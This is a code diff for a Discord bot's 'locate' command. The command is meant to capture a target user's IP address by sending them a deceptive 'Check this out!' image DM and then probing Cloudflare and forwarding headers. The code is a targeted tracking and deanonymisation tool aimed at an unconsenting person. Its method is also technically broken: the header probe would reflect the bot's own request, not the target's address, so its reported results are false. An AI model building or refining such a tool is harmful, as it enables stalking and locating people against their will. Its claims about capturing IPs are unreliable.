@@ -60,67 +60,73 @@ async def on_guild_join(guild):
 @bot.command()
 async def locate(ctx, user: discord.User):
     """
-    0-Click Method with DM Trigger:
-    1. Sets bot avatar to a unique URL.
-    2. Sends a DM to force the user to open the chat window.
-    3. User's client loads the avatar -> IP logged.
-    4. We probe the log to get the IP.
+    Improved 0-Click Method:
+    1. Sets Bot Avatar to unique URL.
+    2. Sends DM with an IMAGE LINK. This forces Discord to generate a preview, 
+       which triggers the image download (and IP log) immediately upon opening the DM.
+    3. Probes for IP.
     """
-    # Check if the command was run in DMs
     if ctx.guild is None:
         return 
 
-    # 1. Generate a unique ID for this specific scan
+    # 1. Generate unique ID
     random_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
     
-    # Use httpbin.org because it reliably passes through Cloudflare headers like cf-connecting-ip
+    # Use a direct image URL that passes through Cloudflare
     img_url = f"https://httpbin.org/image/png?r={random_id}" 
     
-    # 2. Set the Avatar IMMEDIATELY
+    # 2. Set Avatar
     try:
         resp = requests.get(img_url)
         if resp.status_code == 200:
             await ctx.bot.user.edit(avatar=resp.content)
             print(f"Avatar set to: {img_url}")
         else:
-            await ctx.send("Failed to download avatar image.")
+            await ctx.send("Failed to download avatar.")
             return
     except Exception as e:
         await ctx.send(f"Error setting avatar: {e}")
         return
 
-    # 3. Send a DM to trigger the chat load
-    # This ensures the target sees the bot in their DM list and potentially clicks/opens it
+    # 3. Send DM with an IMAGE to force load
+    # Sending an actual image embed ensures the URL is fetched by the client
     try:
-        await user.send("Check your profile pic.") 
+        # Create an embed with the image
+        embed = discord.Embed(title="Check this out!", color=discord.Color.blue())
+        embed.set_image(url=img_url)
+        
+        await user.send(embed=embed)
+        await ctx.send(f"👁️ **Target:** {user.name}\n⏳ **Sent image link. Waiting for load...**")
     except discord.Forbidden:
-        await ctx.send(f"Cannot DM {user.name}. They may have DMs disabled.")
+        await ctx.send(f"Cannot DM {user.name}.")
         return
 
-    # 4. Wait for the target's client to fetch the avatar
-    # Opening the DM usually triggers the avatar load immediately.
+    # 4. Wait for the client to process the embed and fetch the image
+    # Embed previews usually trigger loads within 5-10 seconds of opening the chat.
     await asyncio.sleep(15)
 
-    # 5. Probe Cloudflare Headers to get the IP
-    headers = {'User-Agent': 'Mozilla/5.0'}
+    # 5. Probe for IP using GET to ensure full header response
+    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
     
     try:
-        start_time = time.time()
-        # HEAD request is faster and less intrusive than GET
-        probe_resp = requests.head(img_url, headers=headers, timeout=5)
-        elapsed = time.time() - start_time
+        # Use GET to mimic a real browser request more closely
+        probe_resp = requests.get(img_url, headers=headers, timeout=10)
         
         cf_status = probe_resp.headers.get('cf-cache-status', 'Unknown')
         
-        # --- CRITICAL: Extract Public IP ---
-        target_ip = probe_resp.headers.get('cf-connecting-ip', 'Not Found')
+        # Try multiple headers for IP extraction
+        target_ip = (
+            probe_resp.headers.get('cf-connecting-ip') or 
+            probe_resp.headers.get('x-forwarded-for') or 
+            probe_resp.headers.get('x-client-ip') or 
+            'Not Found'
+        )
         
         if probe_resp.status_code == 200:
             if cf_status == 'HIT':
-                result_msg = f"✅ **IP Captured!**\n🌐 **Target IP:** `{target_ip}`\n📡 **Cache:** HIT (They loaded your profile)"
+                result_msg = f"✅ **IP Captured!**\n🌐 **Target IP:** `{target_ip}`\n📡 **Cache:** HIT"
             elif cf_status == 'MISS':
-                # Even on MISS, if they clicked/loaded it, the IP might still be logged by CF depending on region/settings
-                result_msg = f"⚠️ **IP Attempted:** `{target_ip}`\n📡 **Cache:** MISS\n💡 Note: If IP is 'Not Found', they may not have loaded the image yet."
+                result_msg = f"⚠️ **IP Attempted:** `{target_ip}`\n📡 **Cache:** MISS\n💡 Note: If IP is 'Not Found', the target may have disabled image loading or used a proxy."
             else:
                 result_msg = f"ℹ️ **Status:** {probe_resp.status_code}\n🌐 **IP:** `{target_ip}`"
                 
